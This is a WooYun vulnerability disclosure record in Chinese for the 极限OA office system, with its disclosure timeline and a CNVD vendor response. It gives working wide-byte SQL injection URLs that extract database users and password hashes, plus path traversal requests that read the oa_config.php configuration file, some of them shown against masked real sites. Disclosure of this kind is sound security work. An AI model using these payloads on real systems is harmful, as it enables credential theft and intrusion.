{"id": 69699, "wybug_id": "wooyun-2015-0126661", "wybug_title": "极限OA三处宽字节注入/任意文件下载/任意文件读取", "wybug_corp": "极限OA", "wybug_author": "路人甲", "wybug_date": "2015-07-16 16:30", "wybug_open_date": "2015-10-15 15:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-17：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向公众公开  简要描述： 呵呵 官网可以下载测试的 详细说明：  继续上发：http://**.**.**.**/bugs/wooyun-2015-0115361 测试程序自己可以在上面这个链接找到下载极限OA的用户量说实在的非常巨大，我该怎么跟你形容呢？三个注入宽字节的注入点：问题一：SQL/inc/finger/use_finger.php?USER_ID=-1%df问题二：SQL/general/ems/manage/search_excel.php?LOGIN_USER_ID=1&EMS_TYPE=1%df问题三：SQL/general/ems/query/search_excel.php?LOGIN_USER_ID=1%bf%27问题四：任意文件下载 /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php问题五：任意文件读取/module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php官方程序测试：SQL1:\nhttp://shell/inc/finger/use_finger.php?USER_ID=-123%df'and extractvalue(1, concat(0x5c,(select user() from `user` limit 1)))%23\n\n\nSQL2:\nhttp://shell//general/ems/manage/search_excel.php?LOGIN_USER_ID=1&EMS_TYPE=1%df'and extractvalue(1, concat(0x5c,(select concat (USER_ID,PASSWORD) from `user` limit 1)))%23\n\n\nSQL3：\nhttp://shell//general/ems/query/search_excel.php?LOGIN_USER_ID=1%df'and extractvalue(1, concat(0x5c,(select version() from `user` limit 1)))%23\n\n\n任意文件下载：\nhttp://shell/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php\n\n\n任意文件读取：\nhttp://shell//module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php\n\n\n   漏洞证明：  5个案例测试吧；更多案例自己找吧，有些案例没有2-3注入的文件案例1：http://**.**.**.**:800//inc/finger/use_finger.php?USER_ID=-123%df'and extractvalue(1, concat(0x5c,(select user() from `user` limit 1)))%23\n\n案例2：http://**.**.**.**/general/ems/manage/search_excel.php?LOGIN_USER_ID=1&EMS_TYPE=1%df'and extractvalue(1, concat(0x5c,(select concat (USER_ID,PASSWORD) from `user` limit 1)))%23\n\n案例3：http://**.**.**.**/general/ems/query/search_excel.php?LOGIN_USER_ID=1%df'and extractvalue(1, concat(0x5c,(select version() from `user` limit 1)))%23\n\n案例4：http://**.**.**.**:2013//general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php\n\n案例5：http://**.**.**.**:8080//module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-07-17 15:55 厂商回复： CNVD确认所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}